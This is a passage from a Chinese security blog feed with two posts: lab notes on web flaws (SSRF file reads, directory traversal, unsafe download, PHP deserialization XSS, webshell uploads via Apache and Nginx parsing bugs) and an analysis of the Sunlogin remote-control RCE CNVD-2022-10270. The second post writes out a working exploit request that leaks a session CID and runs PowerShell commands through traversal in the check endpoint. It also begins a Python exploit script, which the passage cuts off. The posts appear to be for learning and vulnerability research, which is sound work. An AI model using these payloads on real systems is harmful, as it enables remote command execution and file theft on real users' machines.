class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取了文件，并且打印出来。</p><p>读取文件。</p><pre><code>http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///D://1.txt</code></pre><p>读取文件并转base64编码。</p><pre><code>http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=D://1.txt</code></pre><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="../../目录遍历"></a>../../目录遍历</h2><p>在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p><p>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。</p><p>简单说就是类似于文件包含，不过是可以通过../进行文件夹上级的文件访问。而且文件包含如果没对目录遍历进行过滤也是可以进行访问上级的文件的。</p><h3 id="目录遍历-1"><a href="#目录遍历-1" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>随便点击一个，url如下。</p><pre><code>http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=jarheads.php</code></pre><p>所以可以构造下面的playload。</p><pre><code>http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=../../../../../../../1.txt</code></pre><p>这里根据自己文件路径而定。</p><h2 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h2><p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。</p><p>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。 </p><p>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！ </p><p>都类似于文件包含，目录遍历，SSRF中的file_get_contents，对前端传入的文件进行一个判断，导致可以访问服务器中的敏感文件。</p><p>这个就是不但可以访问，而且还能下载下来。</p><h3 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h3><p>点击头像进行下载，我们看下载的url。</p><pre><code>127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../../../1.txt</code></pre><p>然后php源码也是没有过滤。</p><p>简单构造下。</p><pre><code>http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../../../1.txt</code></pre><p>就可以下载服务器中的文件了。</p><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><p>先了解两个函数。</p><p>PHP serialize() 函数</p><p>作用：serialize() 函数用于序列化对象或数组，并返回一个字符串。serialize() 函数用于序列化对象或数组，并返回一个字符串。</p><p>例子：</p><pre><code>&lt;?php$sites = array(&#39;Google&#39;, &#39;Runoob&#39;, &#39;Facebook&#39;);$serialized_data = serialize($sites);echo  $serialized_data . PHP_EOL;?&gt;a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;</code></pre><p>PHP  unserialize() 函数</p><p>作用：unserialize() 函数用于将通过 serialize() 函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p><pre><code>&lt;?php$str = &#39;a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;&#39;;$unserialized_data = unserialize($str);print_r($unserialized_data);?&gt;Array(    [0] =&gt; Google    [1] =&gt; Runoob    [2] =&gt; Facebook)</code></pre><p>当我们可以控制反序列化的参数时，且后台调用了一些魔法函数的时候，就可能造成漏洞，魔法函数是指在特定的情况下被调用的函数。</p><p>常见魔法函数</p><pre><code>__construct()      当一个对象创建时被调用__destruct()       当一个对象销毁时被调用__toString()       当一个对象被当作一个字符串使用__sleep()          在对象在被序列化之前运行__wakeup           将在序列化之后立即被调用__call()           在对象上下文中调用不可访问的方法时触发__callStatic()     在静态上下文中调用不可访问的方法时触发__get()            用于从不可访问的属性读取数据时__set()            用于将数据写入不可访问的属性__isset()          在不可访问的属性上调用isset()或empty()触发__unset()          在不可访问的属性上使用unset()时触发__invoke()         当脚本尝试将对象调用为函数时触发__autoload()       尝试加载未定义的类时触发__clone()          当对象复制完成时触发</code></pre><h3 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = unserialize(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，创建了一个类，并且里面有一个魔法函数__construct，当有对象被创建时就会执行。并且我们提交的参数是可以反序列化的，所以我们可以创建一个类，并将参数设置成恶意代码，这样这个类被反序列化创建出来的时候就会echo打印，造成xss漏洞。</p><p>playload</p><pre><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:36:&quot;&lt;script&gt;alert(&#39;The_Itach1&#39;)&lt;/script&gt;&quot;;&#125;</code></pre><p><img src="https://s2.loli.net/2022/03/15/daDU6pPmEnSAXi4.png"></p><h2 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h2><p>搭建靶场Vulhub，<a href="https://blog.csdn.net/weixin_45744814/article/details/120185420">https://blog.csdn.net/weixin_45744814/article/details/120185420</a></p><p>换源：<a href="https://blog.csdn.net/weinipangbai/article/details/108589571">https://blog.csdn.net/weinipangbai/article/details/108589571</a></p><pre><code>vim /etc/docker/daemon.json&#123;    &quot;registry-mirrors&quot;: [&quot;https://nfesww3w.mirror.aliyuncs.com&quot;]    #https://nddt8zfh.mirror.aliyuncs.com&#125;</code></pre><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>Apache是当前使用最广泛的Web服务器。Web服务器一般指网站服务器，是指驻留于因特网上某种类型计算机的程序，可以处理浏览器等Web客户端的请求并返回相应响应，也可以放置网站文件，让全世界浏览；可以放置数据文件，让全世界下载。</p><h4 id="Apache-httpd-多后缀解析漏洞"><a href="#Apache-httpd-多后缀解析漏洞" class="headerlink" title="Apache httpd 多后缀解析漏洞"></a>Apache httpd 多后缀解析漏洞</h4><p>Apache httpd</p><pre><code>httpd是Apache超文本传输协议(HTTP)服务器的主程序。被设计为一个独立运行的后台进程，它会建立一个处理请求的子进程或线程的池。</code></pre><p>漏洞产生原理：</p><p>Apache httpd支持多后缀解析，比如说1.php.jpg.png。其会从右向左进行识别后缀，直到找到可识别后缀，然后进行解析。到这里实际上都没什么问题，但是如果运维人员在配置文件给.php添加了处理器，例如下面</p><pre><code>AddHandler application/x-httpd-php .php#对带有php后缀的文件，一律按php文件解析。</code></pre><p>是不是感觉有点像文件上传漏洞的.htaccess配置文件。</p><p>练习，Vulhub的apache_parsing_vulnerability。</p><p>上传一句话木马，文件名称1.php.jpg。<br><img src="https://s2.loli.net/2022/03/17/8moqeuOvhdGH2Zp.png"><br>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>)):</span><br><span class="line"></span><br><span class="line"><span class="variable">$ext</span> = pathinfo(<span class="variable">$_FILES</span>[<span class="string">&#x27;file_upload&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Unsupported filetype uploaded.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_name</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/uploadfiles/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;file_upload&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file_upload&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_name</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Error uploading file - check destination is writeable.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;File uploaded successfully: &#x27;</span> . <span class="variable">$new_name</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    File: &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file_upload&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">endif</span>;</span><br></pre></td></tr></table></figure><p>白名单过滤。</p><h4 id="Apache-httpd-换行解析漏洞-CVE-2017-15715"><a href="#Apache-httpd-换行解析漏洞-CVE-2017-15715" class="headerlink" title="Apache httpd 换行解析漏洞(CVE-2017-15715)"></a>Apache httpd 换行解析漏洞(CVE-2017-15715)</h4><p>漏洞原理，Apache httpd过滤不完善，将1.php%0A仍当做php文件解析，同时能过php黑名单过滤。</p><p>类似于系统命名绕过，但是问题出在Apache httpd。</p><p>影响版本：2.4.0~2.4.29</p><p>靶场练习：CVE-2017-15715</p><p>环境中没有上传文件的html代码，需要自己编写一个。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">           <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">               <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                   <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                   &lt;input type=&quot;text&quot; name=&quot;name&quot; &lt;br&gt;</span><br><span class="line"></span><br><span class="line">                   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">               <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">           <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后f12编辑，name需要我们自己输入。</p><p>bp抓包添加%0a结尾。<br><img src="https://s2.loli.net/2022/03/17/G65jKT7EwcCXu2l.png"><br>这时候访问/test.php%0a，就会出现phpinfo的内容，但是奇怪的是，不知道文件被上传到哪去了。</p><p>修复的话就是使用$_FILES[‘file’][‘name’]，会将name的换行符直接去掉。</p><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>Nginx(engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、简单的配置文件和低系统资源的消耗而闻名。2011年6月1日，nginx 1.0.4发布。</p><p>Nginx是一款轻量级的Web服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like 协议下发行。</p><p>其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好，中国大陆使用nginx网站用户有：百度、京东、新浪、网易、腾讯、淘宝等。</p><h4 id="文件名逻辑漏洞-CVE-2013-4547"><a href="#文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="文件名逻辑漏洞(CVE-2013-4547)"></a>文件名逻辑漏洞(CVE-2013-4547)</h4><p>vulhub靶场可以复现。</p><p>漏洞原理：</p><p>Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析。靶场中的代码如下。</p><pre><code>worker_processes  1;events &#123;    worker_connections  1024;&#125;http &#123;    include       mime.types;    default_type  application/octet-stream;    sendfile        on;    keepalive_timeout  65;    server &#123;        listen       80;        server_name  localhost;        root   html;        index  index.php;        charset utf-8;        location ~ \.php$ &#123;           root           html;           include        fastcgi_params;           fastcgi_pass   php:9000;           fastcgi_index  index.php;           fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;           fastcgi_param  DOCUMENT_ROOT /var/www/html;        &#125;    &#125;&#125;</code></pre><p>一般情况下，只有php文件才会发送到fastcgi解析。</p><p>主要是错误的解析了请求的url的问题，题目源码是黑名单，所以可以上传jgp等文件，并且linux下保存的文件是可以带空格的。如果我们的url是1.jpg\0x20\0x00.php，就可以匹配上正则.php$(意思就是结尾的字符串是.php，但是比较奇怪怎么匹配上的)，从而可以进入Location，然后发送给fastcgi当做php解析，但是真实的文件名称是1.jpg\0x20。</p><p>影响版本：</p><pre><code>Nginx 0.8.41 ~ 1.4.3Nginx 1.5.0 ~ 1.5.7</code></pre><p>复现过程：</p><p>上传webshell，jpg结尾，然后bp抓包，在文件名后面添加空格。<br><img src="https://s2.loli.net/2022/03/22/XIxFJb67RDgGZrq.png"></p><p>访问/uploadfiles/1.jpg…php，修改..为\x20\x00。<br><img src="https://s2.loli.net/2022/03/22/ombZvdyqEgju4wY.png"><br>然后发现成功执行webshell的内容。</p><h4 id="Nginx中的解析漏洞"><a href="#Nginx中的解析漏洞" class="headerlink" title="Nginx中的解析漏洞"></a>Nginx中的解析漏洞</h4><p>漏洞原理：</p><p>Nginx的配置问题，当我们采取/1.jpg/xxx.php的url时，由于是.php后缀，Nginx便会当做php文件处理，然后fastcgi处理时发现xxx.php不存在，然后php.ini配置文件的cgi.fix_pathinfo=1，作用是修复路径，简单理解就是当前路径文件不存在，就去掉。例如“/aaa.xxx/bbb.yyy/ccc.zzz”，ccc.zzz不存在就变成“/aaa.xxx/bbb.yyy”，然后如果bbb.yyy再不存在就变成“/aaa.xxx”。所以我们的url会变成/1.jpg，然后将1.jpg当做php文件处理，前提是security.limit_extensions包括了jpg类型，但是老版本的php是没有这个配置的。</p><p>与版本无关，主要是配置问题。</p><p>修复漏洞：</p><pre><code>cgi.fix_pathinfo=0 security.limit_extensions = .php //只允许php文件才可以执行。</code></pre><p>复现过程。</p><p>靶场中已经有一个jpg，并且也是php低版本，所以直接加/xxx.php即可。<br><img src="https://s2.loli.net/2022/03/22/pNmqSXgfaQAIx9O.png"></p><h4 id=""><a href="#" class="headerlink" title="####"></a>####</h4>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常见漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>向日葵 CNVD-2022-10270分析</title>
      <link href="2022/02/25/%E5%90%91%E6%97%A5%E8%91%B5%20CNVD-2022-10270%E5%88%86%E6%9E%90/"/>
      <url>2022/02/25/%E5%90%91%E6%97%A5%E8%91%B5%20CNVD-2022-10270%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="向日葵-CNVD-2022-10270分析"><a href="#向日葵-CNVD-2022-10270分析" class="headerlink" title="向日葵 CNVD-2022-10270分析"></a>向日葵 CNVD-2022-10270分析</h1><p>最近来看了看这个刚出的CNVD-2022-10270，与其他cve不同的是这个CNVD-2022-10270涉及到二进制的知识比较多。</p><p>这个主要危害是可以任意命令执行，并返回相应回显。</p><h2 id="向日葵是什么"><a href="#向日葵是什么" class="headerlink" title="向日葵是什么"></a>向日葵是什么</h2><p>向日葵远程控制软件是一款阳光的远程控制及远程桌面产品，通过向日葵你可以在世界上任何地点、任何网络中访问并远程控制你家里或办公室的电脑主机。向日葵是一款获得微软认证的远程控制软件，界面友好，简单易用，安全放心。向日葵和全球知名企业高通创锐讯合作推出全球首个从网络芯片实现远程开机/唤醒的一体化远程控制的解决方案。你还可以使用向日葵远程摄像头进行远程监控，轻松打造360度无死角、零成本家庭安防。向日葵远程控制软件已广泛应用于个人电脑，企业PC/服务器，网吧，校园，酒店等领域。</p><p>简单来说就是一个可以实现远程操控的软件。实际上使用还是很普及。</p><h2 id="漏洞分析过程"><a href="#漏洞分析过程" class="headerlink" title="漏洞分析过程"></a>漏洞分析过程</h2><p>网上的很多文章都只是复现了一个过程，但是感觉说服力不是太强，很多地方都找不到原因，这里我尽量通过我自己的理解去猜测第一个发现这个漏洞的师傅的思路是怎样的。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>很多复现文章都是只在单机上进行复现，但是实际上这样会失去很多有用的日志信息，而且实际上那个pdf中的playload估计都参考了日志。</p><p>这里所以最好还是使用双机，一个真机，一个虚拟机。</p><p>安装好即可。</p><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>都知道运行软件的话，会开一个4w以上的监听端口到本机，实际上应该是出自于日志中的这个地方。</p><p>打开软件使用命令查看端口</p><pre><code>tasklist /svc | findstr &quot;SunloginClient.exe&quot;netstat -ano | findstr xxxx</code></pre><p><img src="https://s2.loli.net/2022/02/24/8IKiuCQYGlJLzEB.png"></p><p>然后去查看日志中的信息，并且使用xrkrce工具扫描下可利用的端口。<br><img src="https://s2.loli.net/2022/02/24/YeLI1WavrRsK3qF.png"></p><p>所以我们完全可以通过日志中的字符串来找到exe对应代码。</p><p>upx脱壳后，我们对[service] start listen OK,字符进行交叉引用。<br><img src="https://s2.loli.net/2022/02/24/61HcNSag4JiT2bG.png"></p><h3 id="如何找到的CID"><a href="#如何找到的CID" class="headerlink" title="如何找到的CID"></a>如何找到的CID</h3><p>这个cid，感觉应该就是session，可以理解为进行身份验证一类的东西。</p><p>我们尝试先通过识别码，进行一次远程连接，然后去查看日志。<br><img src="https://s2.loli.net/2022/02/24/tU6sC3qQyaXAkF5.png"><br>我们可以看到日志里面居然记录了cid，还有我们http请求的一些信息，而且根据http请求的内容来看，这里是在验证登录，这里就为我们去用ida找到关键函数提供了关键字符串。</p><p>同样，我们去ida中定位到关键位置，进入sub_140E1C954，这个函数是cgi-bin/rpc接口的处理函数。</p><p>这里我先放出日志中的那几条http请求。</p><pre><code>/cgi-bin/rpc?action=login%2Dtype&amp;, version: HTTP/1.1/cgi-bin/rpc?action=login%2Dtype&amp;, plugin:cgi-bin, session:/cgi-bin/rpc?action=fast%2Dlogin&amp;plugin=desktop&amp;fastcode=k105396229&amp;use_custom_password=1&amp;hostname=xxxxx&amp;verify_string=13unLp&amp;, version: HTTP/1.1/cgi-bin/rpc?action=fast%2Dlogin&amp;plugin=desktop&amp;fastcode=k105396229&amp;use_custom_password=1&amp;hostname=xxxxx&amp;verify_string=13unLp&amp;, plugin:cgi-bin, session:</code></pre><p>从上面的4个请求我们可以知道，action是某种类型，fastcode是伙伴识别码，verify_string是验证码，use_custom_password可能衡唯1，hostname是真机的名称。所以playload实际上也是通过这些数据写出来的。</p><p>接下来我们挨着挨着看代码。<br><img src="https://s2.loli.net/2022/02/24/bFaDoxYiGXekTpz.png"><br>尝试action=login-type。<br><img src="https://s2.loli.net/2022/02/24/uvIdMYqZSx4lTtO.png"><br>尝试verify-haras。<br><img src="https://s2.loli.net/2022/02/24/mLotV5EXIexMNYU.png"><br>可以看到，进入返回了cid，这也是最重要的，有了cid相当于就已经可以身份验证了。而且我猜测第一个rce的师傅估计也是这样试出来的，因为这个程序不好动调，创建了3个exe，只靠静态看实际上可能并不能看出这里能返回cid。</p><p>尝试fast-login，并且不为bind-request，这个if条件里面代码比较多，还是先看看代码。<br><img src="https://s2.loli.net/2022/02/25/DGxdUw1b8FyM9WQ.png"><br>这里只展开了一些关键部分，然后尝试去发包，可以发现实际上只需要4个参数，就可以获得CID。<br><img src="https://s2.loli.net/2022/02/25/TNhvX18ckC9YEIM.png"><br>返回了Set-Cookie: CID=KFFQnos219TYGPyJ5TofK7GjYxY78EYT。</p><p>所以上面两种方式可以获得CID，一种是action=verify-haras，一种是正常利用伙伴识别码和验证码。而第一种实际上就是漏洞所在，这种情况是不应该返回cid的。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们知道了当action=verify-haras时，就可以泄露pid，可是如何利用呢。这就必须要到sub_140E1C954函数的上一级sub_140E21528去分析其他接口了，这里接口很多，我就只分析那个check接口了，函数为sub_140E1B788。</p><p><img src="https://s2.loli.net/2022/02/25/dxhMfnUJ9BqmSkL.png"><br>然后查看sub_140E20B64函数，典型的远程cmd，可以参考我另一篇文章Windows-Hack-Programming。<br><img src="https://s2.loli.net/2022/02/25/F1wb7VPHeQ9BcaX.png"></p><p>调用check接口传入cmd命令。</p><pre><code>POST /cgi-bin/rpc HTTP/1.1Host: 192.168.0.189:49721Proxy-Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: SLRC/11.0.0.33162 (Windows,x64)Chrome/98.0.4758.82Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Type: application/x-www-form-urlencodedContent-Length: 19action=verify-harasGET /check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+ipconfig version: HTTP/1.1Host: 192.168.0.189:49721Accept-Encoding: gzip, deflateAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Connection: closeAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cookie: CID=dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3</code></pre><p>然后这里本来是想发包的，但是这个cid好像更新的比较快，所以搞了个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># host = sys.argv[1]</span></span><br><span class="line"><span class="comment"># cmd=sys.argv[2]</span></span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;192.168.0.189:49709&quot;</span></span><br><span class="line">cmd=<span class="string">&quot;ipconfig&quot;</span></span><br><span class="line">burp0_url = <span class="string">&quot;http://&quot;</span>+host+<span class="string">&quot;/cgi-bin/rpc?action=verify-haras&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Cache-Control&quot;</span>: <span 